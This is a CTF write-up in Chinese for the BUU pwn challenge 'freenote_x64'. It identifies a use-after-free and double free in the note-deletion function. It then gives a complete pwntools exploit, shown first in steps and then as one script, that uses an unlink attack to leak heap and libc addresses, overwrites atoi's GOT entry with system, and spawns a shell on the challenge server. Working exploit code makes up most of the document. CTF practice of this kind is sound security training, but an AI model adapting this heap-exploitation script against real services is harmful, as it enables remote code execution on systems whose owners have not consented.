# freenote_x64

## 来源
BUU


## 难度

5 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
 ```

## 简单描述

提供打印添加删除和修改功能, 修改功能若大小与之前的不相等, 就realloc

## vul

```c
int del()
{
  int v1; // [rsp+Ch] [rbp-4h]

  if ( *(_QWORD *)(qword_6020A8 + 8) <= 0LL )
    return puts("No notes yet.");
  printf("Note number: ");
  v1 = input_n();
  if ( v1 < 0 || (signed __int64)v1 >= *(_QWORD *)qword_6020A8 )
    return puts("Invalid number!");
  --*(_QWORD *)(qword_6020A8 + 8);
  *(_QWORD *)(qword_6020A8 + 24LL * v1 + 16) = 0LL;
  *(_QWORD *)(qword_6020A8 + 24LL * v1 + 24) = 0LL;
  free(*(void **)(qword_6020A8 + 24LL * v1 + 32));// vul
  return puts("Done.");
}
```

删除功能没有指针清零, 造成uaf漏洞可以double free

## 知识点

unlink

## 思路

由于本题的指针数据不是储存在全局变量中, 而是存在在堆中, 先泄漏堆地址, 而uaf漏洞可以结合修改功能来实现unlink, 采用unlink 来实现打印atoi的got表, 获取libc基址, 修改atoi的got数据为system地址, 传入'/bin/sh' get shell



## 利用

### 准备

```
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'freenote_x64'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 26508

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(data):
	sla(':', str(2))
	sla(':', str(len(data)))
	sa(':', data)

def rm(idx):
	sla(':', str(4))
	sla(':', str(idx))

def md(idx, data):
	sla(':', str(3))
	sla(':', str(idx))
	sla(':', str(len(data)))
	sa(':', data)

def dp():
	sla(':', str(1))

def q():
	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad('A' * 0x80) # 0 为了泄漏heap addr和构造fake chunk 触发unlink
	ad('B' * 0x80) # 1 为了泄漏heap addr 和 free时触发unlink
	ad('C' * 0x80) # 2 为了留出空间, 对齐
	ad('D' * 0x80) # 3 为了留出空间, 对齐
	ad('E' * 0x80) # 4 为了防止top chunk 合并

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

### Leak heap addr

```
	rm(3)
	rm(1) # free-> for realloc add data to end
	md(0, 'A' * 0x80 + '0' * 0x10) # for leak heap base addr 
	dp()
	heap_base = u64(ru('\n')[-4:].ljust(8, '\x00')) - ( 0x1c639d0 - 0x1c62000)
	li('heap base ' + hex(heap_base))
	ch_0_ptr = heap_base + 0x30 # chunk 0 ptr
```



### Unlink

```
	p = p64(0) + p64(0x81)
	p += p64(ch_0_ptr - 0x18) + p64(ch_0_ptr - 0x10)
	p += p64(0x80)
	p = p.ljust(0x80, '\x00')
	p += p64(0x80) + p64(0x90)
	p = p.ljust(0x100, '\x00');

	md(0, p)
	# unlink 
	rm(1)
	
```

### Leak libc base

```
# leak libc base
	p =  p64(0) + p64(1) + p64(0x100)
	p += p64(ch_0_ptr - 0x8) + p64(1)
	p += p64(0x8) + p64(exe.got['atoi'])
	p = p.ljust(0x100, '\x00') #for avoi realloc
	md(0, p)
	dp()
	libc_base = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - lib.sym['atoi']
	
	li('libc_base ' + hex(libc_base))
```



### Get shell

```
	p = p64(libc_base + lib.sym['system'])
	md(1, p)

	sl('/bin/sh')
```



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'freenote_x64'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 26508

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(data):
	sla(':', str(2))
	sla(':', str(len(data)))
	sa(':', data)

def rm(idx):
	sla(':', str(4))
	sla(':', str(idx))

def md(idx, data):
	sla(':', str(3))
	sla(':', str(idx))
	sla(':', str(len(data)))
	sa(':', data)

def dp():
	sla(':', str(1))

def q():
	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad('A' * 0x80) # 0
	ad('B' * 0x80) # 1
	ad('C' * 0x80) # 2
	ad('D' * 0x80) # 3
	ad('E' * 0x80) # 4

	rm(3)
	rm(1) # free-> for realloc add data to end
	md(0, 'A' * 0x80 + '0' * 0x10) # for leak heap base addr 
	dp()
	heap_base = u64(ru('\n')[-4:].ljust(8, '\x00')) - ( 0x1c639d0 - 0x1c62000)
	li('heap base ' + hex(heap_base))
	ch_0_ptr = heap_base + 0x30 # chunk 0 ptr

	p = p64(0) + p64(0x81)
	p += p64(ch_0_ptr - 0x18) + p64(ch_0_ptr - 0x10)
	p += p64(0x80)
	p = p.ljust(0x80, '\x00')
	p += p64(0x80) + p64(0x90)
	p = p.ljust(0x100, '\x00');

	md(0, p)
	# unlink 
	rm(1)

	# leak libc base
	p =  p64(0) + p64(1) + p64(0x100)
	p += p64(ch_0_ptr - 0x8) + p64(1)
	p += p64(0x8) + p64(exe.got['atoi'])
	p = p.ljust(0x100, '\x00') #for avoi realloc
	md(0, p)
	ad('A')
	dp()
	libc_base = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - lib.sym['atoi']
	
	li('libc_base ' + hex(libc_base))

	p = p64(libc_base + lib.sym['system'])
	md(1, p)

	sl('/bin/sh')


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

